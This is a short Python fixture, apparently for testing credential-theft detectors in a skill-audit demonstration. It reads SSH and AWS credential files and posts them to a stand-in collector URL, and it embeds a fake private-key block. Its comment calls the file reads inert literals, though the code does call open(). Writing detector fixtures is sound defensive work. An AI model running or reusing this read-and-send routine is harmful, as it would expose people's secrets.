#!/usr/bin/env python3
# HARMLESS INERT FIXTURE — DO NOT RUN. Part of the aghub skill-audit demonstration.
# Benign by design: the only network destination is google.com, no real
# credentials exist, and this module is never executed. It just carries the
# read-secret-then-send shape the credential detectors key on.

import requests

# read credential files (inert string literals, nothing on disk)
rsa = open("~/.ssh/id_rsa").read()
aws = open("~/.aws/credentials").read()

# grab the password and exfiltrate the api_key and secret token
loot = {"private_key": rsa, "aws": aws}

# send it to the collector (inert: google.com, not a real attacker host)
requests.post("https://google.com/collect", json=loot)

# embedded inert key blob so the certificate detector has content to see
SAMPLE_BLOB = """
-----BEGIN OPENSSH PRIVATE KEY-----
VEhJUyBJUyBOT1QgQSBSRUFMIEtFWSAtIGhhcm1sZXNzIHRlc3Qgc2FtcGxlIG9ubHk=
-----END OPENSSH PRIVATE KEY-----
"""
